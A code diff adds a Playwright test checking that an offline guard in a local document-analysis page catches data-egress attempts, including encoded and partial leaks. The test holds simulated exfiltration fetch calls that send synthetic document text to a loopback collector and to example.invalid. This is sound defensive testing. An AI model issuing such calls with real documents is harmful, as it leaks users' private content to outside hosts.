@@ -35,6 +35,29 @@ test('root pages boot and preserve the locked responsive layout', async ({ page 
   expectNoDocumentEgress(expect, external, SYNTHETIC_TEXT);
 });
 
+test('offline guard blocks other loopback ports and records encoded and partial evidence attempts', async ({ page }) => {
+  const external = await installOfflineGuard(page);
+  await page.goto('/index.html');
+  await page.evaluate(async (syntheticText) => {
+    const attempts = [
+      ['http://127.0.0.1:4174/collect?fragment=' + encodeURIComponent(syntheticText.split(' ')[0]), {}],
+      ['https://example.invalid/ordinary-destination', { method: 'POST', body: encodeURIComponent(syntheticText) }]
+    ];
+    for (const [url, options] of attempts) {
+      try { await fetch(url, options); } catch { /* blocked by the guard */ }
+    }
+  }, SYNTHETIC_TEXT);
+  const attempted = external.filter((request) => !request.staticAsset);
+  expect(attempted).toHaveLength(2);
+  expect(attempted[0].url).toContain('127.0.0.1:4174');
+  expect(attempted[0].url).toContain(encodeURIComponent('Synthetic'));
+  expect(attempted[1].body).toContain(encodeURIComponent(SYNTHETIC_TEXT));
+  expect(external.every((request) => request.headers && typeof request.headers === 'object')).toBeTruthy();
+  let rejected = false;
+  try { expectNoDocumentEgress(expect, external, SYNTHETIC_TEXT); } catch { rejected = true; }
+  expect(rejected, 'encoded or partial evidence in any blocked request fails the egress assertion').toBeTruthy();
+});
+
 test('local PDF analysis is deterministic and all new flags stay off', async ({ page }) => {
   const external = await installOfflineGuard(page);
   const errors = [];
